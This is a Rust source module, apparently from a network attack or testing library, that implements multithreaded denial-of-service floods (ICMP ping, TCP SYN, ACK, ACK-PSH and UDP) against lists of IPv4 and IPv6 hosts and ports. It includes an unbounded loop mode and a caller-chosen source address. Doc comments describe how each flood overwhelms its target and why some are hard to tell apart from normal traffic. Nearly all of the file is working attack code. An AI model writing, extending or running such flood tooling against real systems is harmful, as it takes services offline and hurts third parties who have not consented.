use anyhow::Result;
use std::net::Ipv4Addr;
use std::net::Ipv6Addr;

pub mod icmp;
pub mod icmpv6;
pub mod tcp;
pub mod tcp6;
pub mod udp;
pub mod udp6;

use crate::errors::CanNotFoundSourceAddress;
use crate::utils::find_source_addr;
use crate::utils::find_source_addr6;
use crate::utils::get_threads_pool;
use crate::utils::random_port;
use crate::Target;

#[derive(Debug, Clone, Copy, PartialEq)]
pub enum FloodMethods {
    Icmp,
    Syn,
    Ack,
    AckPsh,
    Udp,
}

fn run_flood(
    method: FloodMethods,
    src_ipv4: Ipv4Addr,
    src_port: u16,
    dst_ipv4: Ipv4Addr,
    dst_port: u16,
    max_same_packet: usize,
    max_flood_packet: usize,
) {
    let func = match method {
        FloodMethods::Icmp => icmp::send_icmp_flood_packet,
        FloodMethods::Syn => tcp::send_syn_flood_packet,
        FloodMethods::Ack => tcp::send_ack_flood_packet,
        FloodMethods::AckPsh => tcp::send_ack_psh_flood_packet,
        FloodMethods::Udp => udp::send_udp_flood_packet,
    };

    if max_flood_packet > 0 {
        for _loop_num in 0..max_flood_packet {
            let _ = func(src_ipv4, src_port, dst_ipv4, dst_port, max_same_packet);
        }
    } else {
        loop {
            let _ = func(src_ipv4, src_port, dst_ipv4, dst_port, max_same_packet);
        }
    }
}

fn run_flood6(
    method: FloodMethods,
    src_ipv6: Ipv6Addr,
    src_port: u16,
    dst_ipv6: Ipv6Addr,
    dst_port: u16,
    max_same_packet: usize,
    max_flood_packet: usize,
) {
    let func = match method {
        FloodMethods::Icmp => icmpv6::send_icmpv6_flood_packet,
        FloodMethods::Syn => tcp6::send_syn_flood_packet,
        FloodMethods::Ack => tcp6::send_ack_flood_packet,
        FloodMethods::AckPsh => tcp6::send_ack_psh_flood_packet,
        FloodMethods::Udp => udp6::send_udp_flood_packet,
    };

    if max_flood_packet > 0 {
        for _loop_num in 0..max_flood_packet {
            let _ = func(src_ipv6, src_port, dst_ipv6, dst_port, max_same_packet);
        }
    } else {
        loop {
            let _ = func(src_ipv6, src_port, dst_ipv6, dst_port, max_same_packet);
        }
    }
}

pub fn flood(
    target: Target,
    method: FloodMethods,
    src_ipv4: Option<Ipv4Addr>,
    src_port: Option<u16>,
    threads_num: usize,
    max_same_packet: usize,
    max_flood_packet: usize,
) -> Result<()> {
    let src_port = match src_port {
        Some(p) => p,
        None => random_port(),
    };
    let pool = get_threads_pool(threads_num);
    for host in target.hosts {
        let dst_ipv4 = host.addr;
        let src_ipv4 = match find_source_addr(src_ipv4, dst_ipv4)? {
            Some(s) => s,
            None => return Err(CanNotFoundSourceAddress::new().into()),
        };
        if host.ports.len() > 0 && method != FloodMethods::Icmp {
            for dst_port in host.ports {
                let dst_port = dst_port.clone();
                pool.execute(move || {
                    run_flood(
                        method,
                        src_ipv4,
                        src_port,
                        dst_ipv4,
                        dst_port,
                        max_same_packet,
                        max_flood_packet,
                    );
                });
            }
        } else if method == FloodMethods::Icmp {
            pool.execute(move || {
                run_flood(
                    method,
                    src_ipv4,
                    src_port,
                    dst_ipv4,
                    0,
                    max_same_packet,
                    max_flood_packet,
                );
            });
        }
    }
    Ok(())
}
pub fn flood6(
    target: Target,
    method: FloodMethods,
    src_ipv6: Option<Ipv6Addr>,
    src_port: Option<u16>,
    threads_num: usize,
    max_same_packet: usize,
    max_flood_packet: usize,
) -> Result<()> {
    let src_port = match src_port {
        Some(p) => p,
        None => random_port(),
    };
    let pool = get_threads_pool(threads_num);
    for host in target.hosts6 {
        let dst_ipv6 = host.addr;
        let src_ipv6 = match find_source_addr6(src_ipv6, dst_ipv6)? {
            Some(s) => s,
            None => return Err(CanNotFoundSourceAddress::new().into()),
        };
        if host.ports.len() > 0 && method != FloodMethods::Icmp {
            for dst_port in host.ports {
                let dst_port = dst_port.clone();
                pool.execute(move || {
                    run_flood6(
                        method,
                        src_ipv6,
                        src_port,
                        dst_ipv6,
                        dst_port,
                        max_same_packet,
                        max_flood_packet,
                    );
                });
            }
        } else if method == FloodMethods::Icmp {
            pool.execute(move || {
                run_flood6(
                    method,
                    src_ipv6,
                    src_port,
                    dst_ipv6,
                    0,
                    max_same_packet,
                    max_flood_packet,
                );
            });
        }
    }
    Ok(())
}

/// An Internet Control Message Protocol (ICMP) flood DDoS attack, also known as a Ping flood attack,
/// is a common Denial-of-Service (DoS) attack in which an attacker attempts to overwhelm a targeted device with ICMP echo-requests (pings).
/// Normally, ICMP echo-request and echo-reply messages are used to ping a network device in order to diagnose the health and connectivity of the device and the connection between the sender and the device.
/// By flooding the target with request packets, the network is forced to respond with an equal number of reply packets.
/// This causes the target to become inaccessible to normal traffic.
pub fn icmp_flood(
    target: Target,
    src_ipv4: Option<Ipv4Addr>,
    threads_num: usize,
    max_same_packet: usize,
    max_flood_packet: usize,
) -> Result<()> {
    flood(
        target,
        FloodMethods::Icmp,
        src_ipv4,
        Some(0),
        threads_num,
        max_same_packet,
        max_flood_packet,
    )
}

pub fn icmp_flood6(
    target: Target,
    src_ipv6: Option<Ipv6Addr>,
    threads_num: usize,
    max_same_packet: usize,
    max_flood_packet: usize,
) -> Result<()> {
    flood6(
        target,
        FloodMethods::Icmp,
        src_ipv6,
        Some(0),
        threads_num,
        max_same_packet,
        max_flood_packet,
    )
}

/// In a TCP SYN Flood attack, the malicious entity sends a barrage of SYN requests to a target server but intentionally avoids sending the final ACK.
/// This leaves the server waiting for a response that never comes, consuming resources for each of these half-open connections.
pub fn tcp_syn_flood(
    target: Target,
    src_ipv4: Option<Ipv4Addr>,
    src_port: Option<u16>,
    threads_num: usize,
    max_same_packet: usize,
    max_flood_packet: usize,
) -> Result<()> {
    flood(
        target,
        FloodMethods::Syn,
        src_ipv4,
        src_port,
        threads_num,
        max_same_packet,
        max_flood_packet,
    )
}

pub fn tcp_syn_flood6(
    target: Target,
    src_ipv6: Option<Ipv6Addr>,
    src_port: Option<u16>,
    threads_num: usize,
    max_same_packet: usize,
    max_flood_packet: usize,
) -> Result<()> {
    flood6(
        target,
        FloodMethods::Syn,
        src_ipv6,
        src_port,
        threads_num,
        max_same_packet,
        max_flood_packet,
    )
}

/// TCP ACK flood, or 'ACK Flood' for short, is a network DDoS attack comprising TCP ACK packets.
/// The packets will not contain a payload but may have the PSH flag enabled.
/// In the normal TCP, the ACK packets indicate to the other party that the data have been received successfully.
/// ACK packets are very common and can constitute 50% of the entire TCP packets.
/// The attack will typically affect stateful devices that must process each packet and that can be overwhelmed.
/// ACK flood is tricky to mitigate for several reasons. It can be spoofed;
/// the attacker can easily generate a high rate of attacking traffic,
/// and it is very difficult to distinguish between a Legitimate ACK and an attacking ACK, as they look the same.
pub fn tcp_ack_flood(
    target: Target,
    src_ipv4: Option<Ipv4Addr>,
    src_port: Option<u16>,
    threads_num: usize,
    max_same_packet: usize,
    max_flood_packet: usize,
) -> Result<()> {
    flood(
        target,
        FloodMethods::Ack,
        src_ipv4,
        src_port,
        threads_num,
        max_same_packet,
        max_flood_packet,
    )
}

pub fn tcp_ack_flood6(
    target: Target,
    src_ipv6: Option<Ipv6Addr>,
    src_port: Option<u16>,
    threads_num: usize,
    max_same_packet: usize,
    max_flood_packet: usize,
) -> Result<()> {
    flood6(
        target,
        FloodMethods::Ack,
        src_ipv6,
        src_port,
        threads_num,
        max_same_packet,
        max_flood_packet,
    )
}

/// TCP ACK flood with PSH flag set.
pub fn tcp_ack_psh_flood(
    target: Target,
    src_ipv4: Option<Ipv4Addr>,
    src_port: Option<u16>,
    threads_num: usize,
    max_same_packet: usize,
    max_flood_packet: usize,
) -> Result<()> {
    flood(
        target,
        FloodMethods::AckPsh,
        src_ipv4,
        src_port,
        threads_num,
        max_same_packet,
        max_flood_packet,
    )
}

pub fn tcp_ack_psh_flood6(
    target: Target,
    src_ipv6: Option<Ipv6Addr>,
    src_port: Option<u16>,
    threads_num: usize,
    max_same_packet: usize,
    max_flood_packet: usize,
) -> Result<()> {
    flood6(
        target,
        FloodMethods::AckPsh,
        src_ipv6,
        src_port,
        threads_num,
        max_same_packet,
        max_flood_packet,
    )
}

/// In a UDP Flood attack, the attacker sends a massive number of UDP packets to random ports on the target host.
/// This barrage of packets forces the host to:
/// Check for applications listening at each port.
/// Realize that no application is listening at many of these ports.
/// Respond with an Internet Control Message Protocol (ICMP) Destination Unreachable packet.
pub fn udp_flood(
    target: Target,
    src_ipv4: Option<Ipv4Addr>,
    src_port: Option<u16>,
    threads_num: usize,
    max_same_packet: usize,
    max_flood_packet: usize,
) -> Result<()> {
    flood(
        target,
        FloodMethods::Udp,
        src_ipv4,
        src_port,
        threads_num,
        max_same_packet,
        max_flood_packet,
    )
}

pub fn udp_flood6(
    target: Target,
    src_ipv6: Option<Ipv6Addr>,
    src_port: Option<u16>,
    threads_num: usize,
    max_same_packet: usize,
    max_flood_packet: usize,
) -> Result<()> {
    flood6(
        target,
        FloodMethods::Udp,
        src_ipv6,
        src_port,
        threads_num,
        max_same_packet,
        max_flood_packet,
    )
}
